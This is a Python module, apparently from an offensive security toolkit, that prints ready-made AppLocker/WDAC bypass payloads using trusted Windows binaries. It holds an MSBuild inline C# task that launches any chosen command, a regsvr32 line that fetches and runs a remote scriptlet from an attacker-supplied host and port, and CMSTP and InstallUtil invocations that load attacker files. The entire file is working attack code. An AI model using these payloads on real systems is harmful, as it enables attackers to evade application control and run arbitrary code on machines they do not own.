"""AppLocker/WDAC bypass via trusted binaries — MSBuild, regsvr32, CMSTP."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.applocker_bypass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution", "policy_bypass"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1218"],
}


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None)
    lport = getattr(args, "lport", "8080")
    command = getattr(args, "command", "calc.exe")

    print("[*] AppLocker/WDAC Bypass via Trusted Binaries")

    bypasses = {
        "msbuild_inline_task": '''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run"><ClassExample /></Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs"><![CDATA[
      using Microsoft.Build.Framework; using System.Diagnostics;
      public class ClassExample : ITask {{
        public IBuildEngine BuildEngine {{ get; set; }}
        public ITaskHost HostObject {{ get; set; }}
        public bool Execute() {{ Process.Start("{}"); return true; }}
      }}
    ]]></Code></Task>
  </UsingTask>
</Project>'''.format(command),
        "regsvr32_sct": '''regsvr32 /s /n /u /i:http://{}:{}/payload.sct scrobj.dll'''.format(
            lhost or "LHOST", lport),
        "cmstp_inf": '''cmstp.exe /ni /s C:\\Windows\\Temp\\bypass.inf''',
        "installutil": '''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll''',
    }

    for name, payload in bypasses.items():
        print("\n[{}]".format(name))
        print(payload[:200] + ("..." if len(payload) > 200 else ""))

    return 0
